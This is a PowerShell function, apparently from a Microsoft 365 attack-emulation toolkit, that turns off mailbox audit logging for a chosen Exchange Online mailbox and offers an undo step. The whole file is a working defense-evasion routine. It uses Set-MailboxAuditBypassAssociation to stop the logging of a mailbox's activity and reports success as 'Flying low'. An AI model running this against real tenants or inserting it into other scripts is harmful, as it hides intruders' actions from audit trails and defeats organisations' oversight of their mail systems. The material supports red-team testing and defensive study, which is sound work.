function DisableMailboxAuditing{

    mitre_details("DisableMailboxAuditing")
    $allow_undo = $false

    try {
        $null = Get-Command Get-Mailbox -ErrorAction Stop
        $null = Get-Command Get-MailboxAuditBypassAssociation -ErrorAction Stop
        $null = Get-Command Set-MailboxAuditBypassAssociation -ErrorAction Stop
    }
    catch {
        MAADWriteError "Required Exchange audit cmdlets are not available in the current session"
        MAADWriteError $_.Exception.Message
        WriteMAADExchangeSessionWarningIfNeeded
        MAADWriteInfo "Re-establish Exchange Online access before using this option"
        MAADPause
        return
    }
    
    EnterMailbox("`n[?] Enter mailbox to disable auditing for")

    #Enter mailbox to modify
    $target_account = $global:mailbox_address
    if ($target_account -in "", $null) {
        MAADWriteError "No mailbox was selected"
        MAADPause
        return
    }

    try {
        MAADWriteProcess "Fetching mailbox current config"
        $current_config = Get-MailboxAuditBypassAssociation -Identity $target_account -ErrorAction Stop
        MAADWriteProcess "Current Config -> Mailbox Audit Bypass Enabled : $($current_config.AuditBypassEnabled)"
    }
    catch {
        MAADWriteError "Failed to fetch mailbox audit config"
        MAADWriteError $_.Exception.Message
        MAADPause
        return
    }

    $user_confirm = Read-Host -Prompt "`n[?] Confirm audit log disable for this account (y/n)"
    Write-Host ""

    if ($user_confirm -notin "No","no","N","n") {
        try {
            MAADWriteProcess "Disabling mailbox auditing for account -> $target_account"
            Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $true -ErrorAction Stop | Out-Null
            MAADWriteProcess "Waiting for changes to take effect"
            Start-Sleep -s 60
            $updated_config = Get-MailboxAuditBypassAssociation -Identity $target_account -ErrorAction Stop
            MAADWriteProcess "Updated Config -> Mailbox Audit Bypass Enabled : $($updated_config.AuditBypassEnabled)"
            MAADWriteSuccess "Flying low : Mailbox Auditing Disabled"
            $allow_undo = $true
        }
        catch {
            MAADWriteError "Failed to bypass audit logging for account"
            MAADWriteError $_.Exception.Message
        }      
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        $user_confirm = Read-Host -Prompt "`n[?] Undo: Re-enable audit logging for the account (y/n)"
        Write-Host ""

        if ($user_confirm -notin "No","no","N","n") {
            try {
                MAADWriteProcess "Re-enabling mailbox audit logging for account -> $target_account"
                Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $false -ErrorAction Stop | Out-Null
                MAADWriteProcess "Waiting for changes to take effect"
                Start-Sleep -s 60    
                $updated_config = Get-MailboxAuditBypassAssociation -Identity $target_account -ErrorAction Stop
                MAADWriteProcess "Fetching mailbox updated config"
                MAADWriteProcess "Updated Config -> Mailbox Audit Bypass Enabled : $($updated_config.AuditBypassEnabled)"
                MAADWriteSuccess "Re-enabled Audit Logging"
            }
            catch {
                MAADWriteError "Failed to re-enable audit logging"
                MAADWriteError $_.Exception.Message
            }
        }
    }
    MAADPause
}
